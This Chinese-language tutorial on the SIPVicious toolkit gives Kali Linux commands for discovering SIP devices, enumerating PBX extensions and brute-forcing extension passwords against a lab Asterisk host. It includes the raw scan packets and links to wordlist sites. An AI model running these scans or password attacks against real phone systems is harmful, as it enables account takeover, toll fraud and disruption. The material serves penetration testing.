## sipvicious 工具集

	https://code.google.com/p/sipvicious/
	
	svmap：扫描网络中的 SIP 设备
	svwar：扫描指定主机中存在的分机
	svcrack：破击指定主机指定分机的密码
	svreport：管理其他 sipvicious 保存的记录

	root@kali:~# svmap 172.16.8.181
	| SIP Device        | User Agent           | Fingerprint |
	----------------------------------------------------------
	| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |

	root@kali:~# svwar -e 18101-18105 172.16.8.181 -m INVITE
	| Extension | Authentication |
	------------------------------
	| 18101     | reqauth        |

	root@kali:~# svcrack -u 18101 172.16.8.181
	| Extension | Password |
	------------------------
	| 18101     | 18101    |

	root@kali:~# svcrack -u 18101 -r 18101-18105 172.16.8.181
	| Extension | Password |
	------------------------
	| 18101     | 18101    |

	root@kali:~# cat pass.txt 
	18101
	18102
	root@kali:~# svcrack -u 18101 -d pass.txt 172.16.8.181
	| Extension | Password |
	------------------------
	| 18101     | 18101    |
	
### svmap

	扫描网络中的 SIP 设备

	扫描网络：svmap 10.0.0.1-10.0.0.255 172.16.131.1 sipvicious.org/22 10.0.1.1/241.1.1.1-20 1.1.2-20.* 4.1.*.*
		root@kali:~# svmap 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
		
		OPTIONS sip:100@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-2240523530;rport
		Content-Length: 0
		From: "sipvicious"<sip:100@1.1.1.1>;tag=61633130303862353133633401333133353036313335
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "sipvicious"<sip:100@1.1.1.1>
		Contact: sip:100@127.0.1.1:5060
		CSeq: 1 OPTIONS
		Call-ID: 296829197237414745251540
		Max-Forwards: 70

	指定 SIP 消息：svmap -m INVITE 1.1.1.1
		root@kali:~# svmap -m INVITE 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |

		INVITE sip:100@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-3493379307;rport
		Content-Length: 0
		From: "sipvicious"<sip:100@1.1.1.1>;tag=61633130303862353133633401323933363935393737
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "sipvicious"<sip:100@1.1.1.1>
		Contact: sip:100@127.0.1.1:5060
		CSeq: 1 INVITE
		Call-ID: 480547251663743315329904
		Max-Forwards: 70
	
	保存记录，可使用 svreport 管理保存的记录：
		root@kali:~# svmap -s first 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |

	继续某个未完成记录的扫描：
		root@kali:~# svreport list
		Type of scan: svmap
			- first		Incomplete	
			
		root@kali:~# svmap --resume first
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
		
	扫描某次记录：
		root@kali:~# svmap -i first
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
		
	指定目的端口扫描：
		root@kali:~# svmap -p 5060,5061-5062 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
		
	指定本地监听端口：
		root@kali:~# svmap -P 12345 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |

		OPTIONS sip:100@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:12345;branch=z9hG4bK-4064117540;rport
		Content-Length: 0
		From: "sipvicious"<sip:100@1.1.1.1>;tag=6163313030386235313363340133373436323337383739
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "sipvicious"<sip:100@1.1.1.1>
		Contact: sip:100@127.0.1.1:12345
		CSeq: 1 OPTIONS
		Call-ID: 305281148814477226944422
		Max-Forwards: 70
		
	启用 SIP 缩写格式：
		root@kali:~# svmap -c 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |

		OPTIONS sip:100@172.16.8.181 SIP/2.0
		v: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-3229736373;rport
		Content-Length: 0
		f: "sipvicious"<sip:100@1.1.1.1>;tag=6163313030386235313363340133303833393533303633
		i: 217688550103979097797979
		m: sip:100@127.0.1.1:5060
		Accept: application/sdp
		CSeq: 1 OPTIONS
		t: "sipvicious"<sip:100@1.1.1.1>
		Max-Forwards: 70
		
	指定消息头 Via/Contact 中使用的 IP：
		root@kali:~# svmap -x 192.168.8.181 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
		
		OPTIONS sip:100@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 192.168.8.181:5060;branch=z9hG4bK-327882224;rport
		Content-Length: 0
		From: "sipvicious"<sip:100@1.1.1.1>;tag=6163313030386235313363340131313235373737303036
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "sipvicious"<sip:100@1.1.1.1>
		Contact: sip:100@192.168.8.181:5060
		CSeq: 1 OPTIONS
		Call-ID: 53455103864689750052918
		Max-Forwards: 70
		
	绑定本地网卡 IP：
		root@kali:~# svmap -b 172.16.8.182 172.16.8.181
		| SIP Device        | User Agent           | Fingerprint |
		----------------------------------------------------------
		| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |
		
		OPTIONS sip:100@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 172.16.8.182:5060;branch=z9hG4bK-742539805;rport
		Content-Length: 0
		From: "sipvicious"<sip:100@1.1.1.1>;tag=6163313030386235313363340133343233393936343733
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "sipvicious"<sip:100@1.1.1.1>
		Contact: sip:100@172.16.8.182:5060
		CSeq: 1 OPTIONS
		Call-ID: 1115812191951343126572114
	
	随机扫描网络：svmap --randomscan
	随机扫描范围：svmap --randomize sipvicious.org/24
	select 超时时间：svmap -t 0.1 1.1.1.1
	显示更多信息：svmap -vv 172.16.8.181
	安静模式，无任何输出：svmap -q 172.16.8.181
	
### svwar

	-e 参数指定扫描的分机号序列：
		root@kali:~# svwar -m INVITE -e 18101-18105,1000-9999 172.16.8.181
		| Extension | Authentication |
		------------------------------
		| 18101     | reqauth        |
		
	-z 补齐分机号前缀 0：svwar -m INVITE -z 4 -e 1-9999 172.16.8.181
		第一个分机号为：0001

	svwar 的 -m, -c, -t, -s, -R, -q, -v, -p, --resume 等参数与 svmap 类似
		root@kali:~# svwar 172.16.8.181
		WARNING:root:found nothing

		REGISTER sip:172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-543313212;rport
		Content-Length: 0
		From: "1002312336"<sip:1002312336@172.16.8.181>;tag=313030323331323333360132303730383436303737
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "1002312336"<sip:1002312336@172.16.8.181>
		Contact: sip:1002312336@172.16.8.181
		CSeq: 1 REGISTER
		Call-ID: 3592830480
		Max-Forwards: 70

		root@kali:~# svwar -m OPTIONS 172.16.8.181
		| Extension | Authentication |
		------------------------------
		| 600       | noauth         |
		| 500       | noauth         |

		OPTIONS sip:584@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-3489684029;rport
		Content-Length: 0
		From: "584"<sip:584@172.16.8.181>;tag=3538340131363131393230393136
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "584"<sip:584@172.16.8.181>
		Contact: sip:584@172.16.8.181
		CSeq: 1 OPTIONS
		Call-ID: 3098136698
		Max-Forwards: 70

		root@kali:~# svwar -e 18101-18105 172.16.8.181 -m INVITE
		WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
		| Extension | Authentication |
		------------------------------
		| 18101     | reqauth        |

		INVITE sip:2466395359@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-4024028159;rport
		Content-Length: 0
		From: "2466395359"<sip:2466395359@172.16.8.181>;tag=323436363339353335390133333731393938343035
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "2466395359"<sip:2466395359@172.16.8.181>
		Contact: sip:2466395359@172.16.8.181
		CSeq: 1 INVITE
		Call-ID: 233067436
		Max-Forwards: 70

		INVITE sip:18101@172.16.8.181 SIP/2.0
		Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-3696435053;rport
		Content-Length: 0
		From: "18101"<sip:18101@172.16.8.181>;tag=313831303101343830393135363334
		Accept: application/sdp
		User-Agent: friendly-scanner
		To: "18101"<sip:18101@172.16.8.181>
		Contact: sip:18101@172.16.8.181
		CSeq: 1 INVITE
		Call-ID: 417485715
		Max-Forwards: 70

		INVITE sip:18102@172.16.8.181 SIP/2.0
		INVITE sip:18103@172.16.8.181 SIP/2.0
		INVITE sip:18104@172.16.8.181 SIP/2.0
		INVITE sip:18105@172.16.8.181 SIP/2.0

### svcrack

	-u 指定用户名破解密码
		root@kali:~# svcrack -u 18101 172.16.8.181
		| Extension | Password |
		------------------------
		| 18101     | 18101    |
		
	-r 指定密码序列破解密码
		root@kali:~# svcrack -u 18101 -r 18101-18105 172.16.8.181
		| Extension | Password |
		------------------------
		| 18101     | 18101    |
		
	-d 指定密码字典文件破解指定用户密码：
		root@kali:~# cat pass.txt 
		18101
		18102
		root@kali:~# svcrack -u 18101 -d pass.txt 172.16.8.181
		| Extension | Password |
		------------------------
		| 18101     | 18101    |
		
### 密码字典文件

	ftp://ftp.ibiblio.org/pub/linux/distributions/openwall/wordlists/
	http://wordlist.sourceforge.net/
	http://packetstormsecurity.org/Crackers/wordlists/
	http://www.phreak.org/html/wordlists.shtml
	http://www.cotse.com/tools/wordlists1.htm
	ftp://ftp.ox.ac.uk/pub/wordlists/
	http://www.word-list.com/
	http://www.outpost9.com/files/WordLists.html